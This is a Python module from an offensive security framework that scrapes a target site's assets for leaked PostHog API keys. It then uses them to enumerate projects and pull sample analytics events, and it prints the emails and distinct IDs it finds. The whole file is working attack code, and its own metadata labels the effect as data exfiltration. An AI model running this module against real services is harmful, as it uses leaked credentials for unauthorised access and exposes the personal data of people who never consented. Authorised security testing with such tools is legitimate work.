#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Enumerate PostHog projects and events (PII) using leaked personal API keys."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.posthog_probe import enumerate_posthog
from lib.scanner.http.vibe_secrets_probe import collect_vibe_http_bodies, mask_secret


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "PostHog Analytics PII Enumeration",
        "description": (
            "Uses leaked PostHog personal API keys (phx_) to list projects and sample "
            "events that may contain emails and distinct IDs. Auto-discovers from bundles."
        ),
        "author": ["KittySploit Team"],
        "tags": ["posthog", "analytics", "pii", "enumeration", "auxiliary", "privacy"],
        "modules": ["scanner/http/posthog_rum_detect", "scanner/http/vibe_stack_secrets_detect"],
        "agent": {
            "risk": "intrusive",
            "effects": ["network_probe", "data_exfiltration"],
            "expected_requests": 5,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "risk_signals"],
            "cost": 1.1,
            "noise": 0.3,
            "value": 1.2,
        },
    }

    personal_api_key = OptString("", "PostHog personal API key (phx_…)", False)
    project_api_key = OptString("", "PostHog project key (phc_…) — discovery only", False)
    api_host = OptString("", "PostHog API host (https://us.posthog.com)", False)
    auto_discover = OptBool(True, "Scrape target assets for PostHog keys", False)

    def run(self):
        bodies = collect_vibe_http_bodies(self.http_request) if self._to_bool(self.auto_discover) else []
        homepage = next((t for p, t in bodies if p == "/"), "")
        if not homepage and bodies:
            homepage = bodies[0][1]

        self._configure_session()
        verify = self._to_bool(self.verify_ssl)

        findings, creds = enumerate_posthog(
            self.session,
            homepage,
            verify_ssl=verify,
            personal_key=str(self.personal_api_key or "").strip(),
            project_key=str(self.project_api_key or "").strip(),
            api_host=str(self.api_host or "").strip(),
        )

        ok = [f for f in findings if f.get("ok")]
        if not ok:
            print_error("No PostHog API access (phx_ personal key required; enable auto_discover)")
            return False

        for hit in ok:
            kind = hit.get("kind") or "access"
            if kind == "projects_listed":
                print_success(f"PostHog: {hit.get('count', 0)} project(s) — {hit.get('projects', [])}")
            elif kind == "events_with_pii":
                print_success(f"PostHog events: {len(hit.get('event_samples') or [])} sample(s)")
                for ev in hit.get("event_samples") or []:
                    print_info(f"  → {ev.get('event')} / {ev.get('distinct_id')} / {ev.get('email_hint')}")

        self.set_info(
            severity="critical",
            reason=f"PostHog enum: {len(ok)} accessible endpoint(s)",
            findings=findings,
            credentials={k: mask_secret(v) if "key" in k else v for k, v in creds.items()},
        )
        return True
